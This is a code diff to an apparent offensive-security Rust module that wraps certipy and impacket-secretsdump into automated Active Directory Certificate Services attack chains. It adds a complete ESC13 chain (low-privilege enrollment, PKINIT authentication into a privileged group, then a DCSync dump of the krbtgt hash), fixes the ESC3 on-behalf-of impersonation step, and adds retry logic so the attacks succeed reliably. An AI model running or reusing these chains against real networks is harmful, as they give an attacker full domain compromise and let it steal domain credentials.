@@ -712,6 +712,19 @@ pub async fn certipy_esc4_full_chain(args: &Value) -> Result<ToolOutput> {
     })
 }
 
+/// NetBIOS/flat domain name for certipy `-on-behalf-of` (`NETBIOS\principal`).
+/// certipy rejects an FQDN there ("Domain part … should not be a FQDN") and the
+/// CA then denies the request. Prefer an explicit `nt_domain`/`flat_name` arg;
+/// otherwise derive it from the first DNS label of `domain`, uppercased
+/// (`contoso.local` -> `CONTOSO`).
+fn on_behalf_nt_domain(args: &Value, domain: &str) -> String {
+    optional_str(args, "nt_domain")
+        .or_else(|| optional_str(args, "flat_name"))
+        .filter(|s| !s.is_empty())
+        .map(|s| s.to_string())
+        .unwrap_or_else(|| domain.split('.').next().unwrap_or(domain).to_uppercase())
+}
+
 /// Run the full ESC3 (Enrollment Agent) exploitation chain in one shot:
 /// enroll the agent cert, request a cert on behalf of a target principal
 /// using the agent cert, then authenticate with the resulting PFX.
@@ -737,6 +750,8 @@ pub async fn certipy_esc4_full_chain(args: &Value) -> Result<ToolOutput> {
 ///     enrollment, override here)
 ///   - `on_behalf_of` (target principal sAMAccountName; defaults to
 ///     `administrator`)
+///   - `nt_domain` / `flat_name` (NetBIOS domain for `-on-behalf-of`; derived
+///     from the FQDN's first label if omitted)
 pub async fn certipy_esc3_full_chain(args: &Value) -> Result<ToolOutput> {
     let username = required_str(args, "username")?;
     let domain = required_str(args, "domain")?;
@@ -794,10 +809,16 @@ pub async fn certipy_esc3_full_chain(args: &Value) -> Result<ToolOutput> {
         );
     }
 
-    // `domain\\principal` form is what certipy expects for `-on-behalf-of`
-    // (NetBIOS-style). The single-backslash escape in the format string
-    // becomes a literal `\` on the command line.
-    let on_behalf_target = format!("{domain}\\{on_behalf_of}");
+    // certipy's `-on-behalf-of` wants `NETBIOS\principal`, NOT the DNS/FQDN
+    // domain. Passing `contoso.local\administrator` makes certipy warn
+    // "Domain part of '-on-behalf-of' should not be a FQDN" and the CA policy
+    // module denies the request (0x80070547 "Denied by Policy Module"), so no
+    // on-behalf-of cert issues — the whole ESC3 chain fails. Derive the NetBIOS
+    // name from the first DNS label, uppercased (contoso.local -> CONTOSO), unless
+    // an explicit flat name is supplied. The single-backslash escape becomes a
+    // literal `\` on the command line.
+    let nt_domain = on_behalf_nt_domain(args, domain);
+    let on_behalf_target = format!("{nt_domain}\\{on_behalf_of}");
     let request_output = CommandBuilder::new("certipy")
         .arg("req")
         .flag("-username", &user_at_domain)
@@ -869,6 +890,152 @@ pub async fn certipy_esc3_full_chain(args: &Value) -> Result<ToolOutput> {
         stderr: combined_stderr,
         exit_code: auth_output.exit_code,
         success: agent_output.success && request_output.success && auth_output.success,
+    })
+}
+
+/// Full ESC13 (issuance-policy → group link) exploitation chain in one shot:
+/// enroll the template AS THE LOW-PRIV USER (no subject/SID override), PKINIT-auth
+/// with the resulting cert, then DCSync `krbtgt` with the now-elevated ccache.
+///
+/// ESC13 is fundamentally different from ESC1. The vulnerable template's issuance
+/// policy OID is linked (`msDS-OIDToGroupLink`) to a privileged AD group, so a
+/// cert issued to the *enrolling* user carries that OID and the DC adds the linked
+/// group's SID to the PKINIT TGT's PAC — no impersonation needed. Passing
+/// `-upn`/`-sid` here (ESC1 semantics) is wrong: it makes the CA policy module
+/// deny the request (`0x80070547`) or trips KB5014754 strict mapping (the cert's
+/// Security-Extension SID is the requester's, not the target's). So we enroll
+/// plainly and let the OID do the work, then DCSync as the enrolling user — whose
+/// TGT now carries the elevated group.
+///
+/// Required args: `username`, `domain`, `password`, `ca`, `template`, `dc_ip`
+/// Optional args: `target`/`ca_host` (CA host when it isn't the DC),
+///                `dc_host` (DC FQDN — required for the DCSync tail).
+pub async fn certipy_esc13_full_chain(args: &Value) -> Result<ToolOutput> {
+    let username = required_str(args, "username")?;
+    let domain = required_str(args, "domain")?;
+    let password = required_str(args, "password")?;
+    let ca = required_str(args, "ca")?;
+    let template = required_str(args, "template")?;
+    let dc_ip = required_str(args, "dc_ip")?;
+    let target = optional_str(args, "target")
+        .or_else(|| optional_str(args, "ca_host"))
+        .or_else(|| optional_str(args, "target_ip"));
+    // DC FQDN for the Kerberos-authenticated DCSync tail — secretsdump's `-k`
+    // target MUST be the DC's FQDN (an IP yields KDC_ERR_S_PRINCIPAL_UNKNOWN).
+    let dc_host = optional_str(args, "dc_host").filter(|s| !s.is_empty());
+
+    let user_at_domain = format!("{username}@{domain}");
+    let tempdir = tempfile::tempdir().context("failed to create tempdir for ESC13 chain")?;
+    let cwd = tempdir.path().to_path_buf();
+
+    let ts = epoch_millis();
+    let out_name = format!("esc13_{ts}");
+    let pfx_name = format!("{out_name}.pfx");
+
+    // Plain enrollment — NO `-upn`/`-sid`. The issuance-policy OID on the template
+    // is what grants the privileged group at auth time.
+    let request_output = CommandBuilder::new("certipy")
+        .arg("req")
+        .flag("-username", &user_at_domain)
+        .flag("-password", password)
+        .flag("-ca", ca)
+        .flag("-template", template)
+        .flag("-dc-ip", dc_ip)
+        .flag("-out", &out_name)
+        .flag_opt("-target", target)
+        .current_dir(&cwd)
+        .timeout_secs(180)
+        .execute()
+        .await?;
+    if !request_output.success {
+        return Ok(request_output);
+    }
+    if !cwd.join(&pfx_name).exists() {
+        anyhow::bail!(
+            "certipy req (ESC13, template={template}) exited 0 but no PFX ({pfx_name}) was \
+             produced — cert NOT issued (wrong CA host / pending approval / enrollment denied). \
+             certipy stdout: {} || stderr: {}",
+            request_output.stdout.trim(),
+            request_output.stderr.trim(),
+        );
+    }
+
+    // PKINIT auth AS the enrolling user — the DC stamps the OID-linked group SID
+    // into the TGT's PAC. Retry the ~50% KRB_AP_ERR_MODIFIED flake (see ESC1).
+    let mut auth_output;
+    let mut auth_attempts = 0;
+    loop {
+        auth_attempts += 1;
+        auth_output = CommandBuilder::new("certipy")
+            .arg("auth")
+            .flag("-pfx", &pfx_name)
+            .flag("-dc-ip", dc_ip)
+            .flag("-domain", domain)
+            .flag("-username", username)
+            .current_dir(&cwd)
+            .timeout_secs(120)
+            .execute()
+            .await?;
+        let transient = auth_output.stdout.contains("KRB_AP_ERR_MODIFIED")
+            || auth_output.stderr.contains("KRB_AP_ERR_MODIFIED");
+        if !transient || auth_attempts >= 4 {
+            break;
+        }
+    }
+
+    let req_label = format!("certipy req (ESC13, template={template})");
+    let auth_label = format!("certipy auth ({pfx_name})");
+
+    // DCSync tail: the elevated ccache (the enrolling user's TGT now carries the
+    // OID-linked group, e.g. Domain Admins) DCSyncs `krbtgt`. Unlike ESC1 there is
+    // no impersonated principal — we DCSync AS the enrolling user. Skipped when no
+    // `dc_host` or no ccache landed.
+    let ccache = find_pkinit_ccache(&cwd, &user_at_domain);
+    let dcsync_output = match (dc_host, ccache.as_deref()) {
+        (Some(dc_fqdn), Some(ccache_path)) => {
+            let target_str = format!("{domain}/{username}@{dc_fqdn}");
+            let out = CommandBuilder::new("impacket-secretsdump")
+                .arg("-k")
+                .arg("-no-pass")
+                .arg(&target_str)
+                .flag("-dc-ip", dc_ip)
+                .flag("-just-dc-user", "krbtgt")
+                .env("KRB5CCNAME", ccache_path)
+                .current_dir(&cwd)
+                .timeout_secs(180)
+                .execute()
+                .await?;
+            Some((
+                format!("secretsdump krbtgt DCSync (target={target_str})"),
+                out,
+            ))
+        }
+        _ => None,
+    };
+
+    let dcsync_label = dcsync_output.as_ref().map(|(label, _)| label.clone());
+    let mut steps: Vec<(&str, &ToolOutput)> =
+        vec![(&req_label, &request_output), (&auth_label, &auth_output)];
+    if let (Some(label), Some((_, out))) = (&dcsync_label, &dcsync_output) {
+        steps.push((label.as_str(), out));
+    }
+    let (combined_stdout, combined_stderr) = render_chain_output(&steps);
+
+    // Success = the DCSync tail dumped krbtgt (the authoritative compromise
+    // signal). With no tail, fall back to `certipy auth` recovering a hash.
+    let got_nt_hash = auth_output.stdout.contains("Got hash for");
+    let (exit_code, overall_success) = match &dcsync_output {
+        Some((_, out)) => (out.exit_code, request_output.success && out.success),
+        None => (
+            auth_output.exit_code,
+            request_output.success && auth_output.success && got_nt_hash,
+        ),
+    };
+    Ok(ToolOutput {
+        stdout: combined_stdout,
+        stderr: combined_stderr,
+        exit_code,
+        success: overall_success,
     })
 }
 
@@ -954,11 +1121,14 @@ pub async fn certipy_esc1_full_chain(args: &Value) -> Result<ToolOutput> {
         );
     }
 
-    // certipy auth must send the bare sAMAccountName. For the built-in
-    // Administrator (RID-500) the UPN-form principal makes the PKINIT AS-REP
-    // fail with KRB_AP_ERR_MODIFIED and no ccache is written; -username derives
-    // the client name so the TGT/ccache lands. (SID-mapped UnPAC may still fail
-    // ETYPE_NOSUPP on RC4-disabled KDCs — that path is handled by the DCSync tail.)
+    // Pass the bare sAMAccountName (split from the UPN) as certipy's -username
+    // so the client principal is pinned explicitly rather than inferred from the
+    // PFX. This does NOT fix the KRB_AP_ERR_MODIFIED flake: an A/B test showed
+    // the AS-REP failure is ~50% and independent of -username (it recurred with
+    // the flag and succeeded without it). The retry loop below is the actual fix
+    // — the flag is kept only as a harmless explicit principal override. (SID-
+    // mapped UnPAC may still fail ETYPE_NOSUPP on RC4-disabled KDCs — that path
+    // is handled by the DCSync tail.)
     let auth_user = upn.split('@').next().unwrap_or("administrator");
     // certipy PKINIT intermittently fails the AS exchange with KRB_AP_ERR_MODIFIED
     // ("Message stream modified") — a transient DH/session-key mismatch (~50% per
@@ -1520,14 +1690,32 @@ mod tests {
 
     #[test]
     fn certipy_esc3_full_chain_on_behalf_target_format() {
-        // certipy expects `domain\\principal` (NetBIOS-style, single
-        // backslash) for `-on-behalf-of`. Verify the format string compiles
-        // to exactly one backslash.
-        let domain = "contoso.local";
-        let on_behalf_of = "administrator";
-        let on_behalf_target = format!("{domain}\\{on_behalf_of}");
-        assert_eq!(on_behalf_target, "contoso.local\\administrator");
-        assert_eq!(on_behalf_target.matches('\\').count(), 1);
+        // certipy's `-on-behalf-of` needs `NETBIOS\principal`, NOT the FQDN —
+        // an FQDN there makes the CA policy module deny the request. Derive the
+        // NetBIOS name from the first DNS label, uppercased; an explicit
+        // nt_domain/flat_name overrides.
+        let args = json!({});
+        assert_eq!(
+            super::on_behalf_nt_domain(&args, "contoso.local"),
+            "CONTOSO"
+        );
+        assert_eq!(
+            super::on_behalf_nt_domain(&args, "child.contoso.local"),
+            "CHILD"
+        );
+        let ov = json!({"nt_domain": "FABRIKAM"});
+        assert_eq!(super::on_behalf_nt_domain(&ov, "contoso.local"), "FABRIKAM");
+        // The final -on-behalf-of is NETBIOS\principal: one backslash, no FQDN.
+        let target = format!(
+            "{}\\administrator",
+            super::on_behalf_nt_domain(&args, "contoso.local")
+        );
+        assert_eq!(target, "CONTOSO\\administrator");
+        assert_eq!(target.matches('\\').count(), 1);
+        assert!(
+            !target.split('\\').next().unwrap().contains('.'),
+            "domain part must not be an FQDN"
+        );
     }
 
     #[test]
